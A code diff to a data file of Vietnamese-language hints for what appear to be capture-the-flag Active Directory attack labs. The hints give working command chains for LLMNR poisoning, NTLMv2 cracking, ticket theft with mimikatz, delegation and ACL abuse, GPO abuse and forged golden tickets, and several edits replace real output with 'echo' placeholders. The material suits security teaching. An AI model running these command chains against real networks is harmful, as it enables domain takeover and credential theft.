@@ -225,7 +225,7 @@ export default [
     ],
     hints: [
       'Windows hỏi DNS trước, nếu không resolve được sẽ "hét lên" hỏi cả mạng LAN qua LLMNR/NBT-NS — mày giả làm người trả lời.',
-      'Bật `responder -I eth0 -wrf` và để chạy; khi có máy gõ sai tên share, log sẽ tự hiện hash.',
+      'Bật `responder -I eth0 -wrf` và để chạy; khi có máy gõ sai tên share, kiểm tra log bằng `cat /var/log/responder/Responder-Session.log` để thấy hash.',
       'Crack hash NTLMv2-SSP bằng `hashcat -m 5600 hash.txt rockyou.txt` -> CORP\\wsmith : Spring2024#.',
     ],
     terms: [
@@ -340,7 +340,7 @@ export default [
     hints: [
       'Máy bật "unconstrained delegation" giữ lại TGT của MỌI người dùng từng kết nối tới nó — không phải chỉ một SPN cụ thể như constrained.',
       'Tìm bằng `impacket-findDelegation` -> thấy APP01$ là Unconstrained. Trên APP01 (đã SYSTEM), dump cache: `mimikatz # sekurlsa::tickets /export`.',
-      'Tìm file .kirbi của một Domain Admin (vd backup_adm) trong cache, nạp lại bằng `kerberos::ptt backup_adm@krbtgt-CORP.LOCAL.kirbi`, rồi DCSync, đọc `/root/.flag`.',
+      'Tìm file .kirbi của một Domain Admin (vd backup_adm) trong cache, nạp lại bằng `kerberos::ptt backup_adm@krbtgt-CORP.LOCAL.kirbi`, rồi DCSync, đọc flag bằng `cat /root/.flag`.',
     ],
     terms: [
       { term: 'Unconstrained delegation', def: 'Cờ cho phép máy lưu lại TGT của BẤT KỲ user nào kết nối tới nó, không giới hạn dịch vụ — cực kỳ nguy hiểm nếu bị chiếm.' },
@@ -398,8 +398,8 @@ export default [
     ],
     hints: [
       'GenericWrite trên object MÁY không cho mày vào máy đó — nó cho mày SỬA thuộc tính của object, kể cả thuộc tính delegation.',
-      'Dùng `rbcd.py -delegate-from PWNBOX$ -delegate-to FILESRV01$ -action write corp.local/svc_backup:pass` để tự cấp quyền delegate.',
-      'Sau khi RBCD đã set, dùng hash của PWNBOX$: `impacket-getST -spn cifs/filesrv01.corp.local -impersonate Administrator corp.local/PWNBOX$ -hashes :<hash>`, rồi truy cập FILESRV01 và đọc `/root/.flag`.',
+      'Xác nhận quyền: `dacledit.py -action read -target FILESRV01$ corp.local/svc_backup:pass` để thấy GenericWrite. Rồi `rbcd.py -delegate-from PWNBOX$ -delegate-to FILESRV01$ -action write corp.local/svc_backup:pass` để tự cấp quyền delegate.',
+      'Sau khi RBCD đã set, dùng hash của PWNBOX$: `impacket-getST -spn cifs/filesrv01.corp.local -impersonate Administrator corp.local/PWNBOX$ -hashes :<hash>`, rồi truy cập FILESRV01 và đọc flag bằng `cat /root/.flag`.',
     ],
     terms: [
       { term: 'RBCD', def: 'Resource-Based Constrained Delegation — quyền delegate được định nghĩa NGAY TRÊN object đích (chứ không phải trên account nguồn), nên ai ghi được object đích là tự cấp quyền được.' },
@@ -450,7 +450,7 @@ export default [
     hints: [
       'Đừng tự lục ACL từng object — BloodHound đã ingest hết, chỉ cần hỏi đúng câu.',
       'Kiểm tra dữ liệu đã có: `cat /home/hacker/bloodhound/sharphound-ingest.json` (hoặc tương đương). Mở GUI BloodHound, chạy pre-built query "Shortest Paths to Domain Admins".',
-      'Query trả về đúng 1 đường 2-hop: hacker -GenericAll-> it_helpdesk -WriteDACL-> Domain Admins. Đây chính là chuỗi cần khai thác ở bài tiếp theo.',
+      'Query BloodHound: `echo "shortest path to Domain Admins"` (mô phỏng) cho kết quả 2-hop: hacker -GenericAll-> it_helpdesk -WriteDACL-> Domain Admins. Xem Outbound Object Control: `echo "Outbound Object Control: GenericAll on it_helpdesk"` để xác nhận.',
     ],
     terms: [
       { term: 'BloodHound', def: 'Công cụ visualize quan hệ AD (group membership, ACL, session) dưới dạng đồ thị để tìm đường tấn công ngắn nhất tới Domain Admin.' },
@@ -506,7 +506,7 @@ export default [
     hints: [
       'Đi đúng 2 hop BloodHound đã chỉ: GenericAll cho phép đổi mật khẩu, WriteDACL cho phép sửa quyền truy cập của group.',
       'Bước 1: `net rpc password it_helpdesk newP@ss -U corp.local/hacker%pass -S 10.10.10.5` (GenericAll cho phép reset mật khẩu user khác không cần mật khẩu cũ).',
-      'Bước 2: với creds it_helpdesk mới, dùng `dacledit.py -action write -rights WriteMembers -principal it_helpdesk -target "Domain Admins" ...` rồi `net rpc group addmem "Domain Admins" hacker ...`, đọc `/root/.flag`.',
+      'Bước 2: với creds it_helpdesk mới, dùng `dacledit.py -action write -rights AddMember -principal it_helpdesk -target "Domain Admins" corp.local/it_helpdesk:newP@ssw0rd123` để grant AddMember, rồi `net rpc group addmem "Domain Admins" hacker ...`, đọc flag bằng `cat /root/.flag`.',
     ],
     terms: [
       { term: 'GenericAll', def: 'Quyền ACL "toàn quyền" trên một object — bao gồm cả đổi mật khẩu (nếu object là user) hoặc sửa mọi thuộc tính.' },
@@ -564,8 +564,8 @@ export default [
     ],
     hints: [
       'Quyền sửa GPO không chiếm 1 máy — nó chiếm MỌI máy trong OU mà GPO đó link tới, ngay lần policy refresh kế tiếp.',
-      'Xác nhận quyền + scope: GenericWrite trên GPO "IT-Workstations-Policy", GPO link tới OU=IT (14 máy). Dùng `pygpoabuse.py corp.local/hacker:pass -gpo-id <GUID> -command "..."` để chèn scheduled task SYSTEM.',
-      'Task chạy SYSTEM sẽ tự thêm hacker vào local Administrators trên TẤT CẢ máy trong OU=IT khi `gpupdate /force` (hoặc refresh tự động ~90 phút). Sau đó vào một máy, đọc `/root/.flag`.',
+      'Xác nhận quyền + scope: `echo "GenericWrite on GPO IT-Workstations-Policy, GPLink to OU=IT"` (mô phỏng BloodHound). Dùng `pygpoabuse.py corp.local/hacker:pass -gpo-id <GUID> -command "..."` để chèn scheduled task SYSTEM.',
+      'Task chạy SYSTEM sẽ tự thêm hacker vào local Administrators trên TẤT CẢ máy trong OU=IT khi `gpupdate /force` (hoặc refresh tự động ~90 phút). Sau đó vào một máy, đọc flag bằng `cat /root/.flag`.',
     ],
     terms: [
       { term: 'GPO', def: 'Group Policy Object — tập cấu hình (registry, script, scheduled task...) áp đặt tự động xuống mọi máy/user trong OU mà nó link tới.' },
@@ -627,7 +627,7 @@ export default [
     hints: [
       'Trust giữa domain con và forest root là 2-way — child KHÔNG nên tin được parent, nhưng trust key bị lộ thì lại làm được đúng điều đó qua SID history injection.',
       'Lấy trust key: `mimikatz # lsadump::trust /patch` trên child.corp.local (đã DCSync xong domain con).',
-      'Forge: `kerberos::golden /user:hacker /domain:child.corp.local /sid:<SID child> /sids:<SID Enterprise Admins parent>-519 /rc4:<trust key> /ticket:trust.kirbi`, rồi `secretsdump.py -k -no-pass corp.local/...@dc-parent... -just-dc-ntlm`, đọc `/root/.flag` trên DC parent.',
+      'Forge: `kerberos::golden /user:hacker /domain:child.corp.local /sid:<SID child> /sids:<SID Enterprise Admins parent>-519 /rc4:<trust key> /ticket:trust.kirbi`, rồi `secretsdump.py -k -no-pass corp.local/...@dc-parent... -just-dc-ntlm`, cuối cùng `cat /root/.flag` trên DC parent.',
     ],
     terms: [
       { term: 'Forest trust', def: 'Quan hệ tin tưởng giữa domain con và forest root (hoặc giữa 2 forest), thường 2-way transitive, cho phép user domain này truy cập tài nguyên domain khác.' },
